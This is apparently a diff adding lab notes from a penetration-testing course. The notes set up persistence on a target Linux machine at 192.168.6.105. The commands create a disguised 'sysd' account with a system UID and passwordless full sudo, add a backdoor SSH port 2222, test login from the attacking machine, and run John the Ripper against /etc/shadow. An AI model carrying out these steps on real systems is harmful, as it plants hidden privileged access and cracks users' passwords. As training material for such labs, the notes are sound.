@@ -1,0 +1,51 @@
+﻿#Step 1: Shadow People
+
+
+#Create a sysd user
+sudo useradd sysd
+#Create a secret password for user
+sudo passwd sysd
+#Create a system UID below 1000 for user
+sudo usermod -u 400 sysd
+#Give user a GID equal to the UID
+sudo groupmod -g 400 sysd
+#Give full sudo access to user without a password
+sudo visudo
+sysd ALL=(ALL:ALL) NOPASSWD:ALL 
+#Test that the sysd user can execute sudo access without a password
+su sysd
+
+
+#Step 2: Smooth Sailing
+
+
+#Using nano, update the /etc/ssh/sshd_config configuration file to allow SSH access via port 2222
+Sudo nano /etc/ssh/sshd_config
+#Add these lines to the configuration file under Add an extra port line:
+Port 22
+Port 2222
+
+
+
+
+#Step 3: Testing The Configuration Update
+
+
+#Restart the SSH service
+service ssh restart
+#Exit the root account and log off of the target machine
+exit
+#Test new backdoor SSH port on the attacking machine
+ssh sysd@192.168.6.105 -p 2222
+#Switch back to the root user using sudo
+sudo su
+
+
+#Step 4: Crack All the Passwords
+
+
+#SSH back into the target machine using the sysd account
+ssh sysd@192.168.6.105 -p 2222
+#Escalate to root, and use John to crack the whole /etc/shadow file
+sudo su
+john /etc/shadow
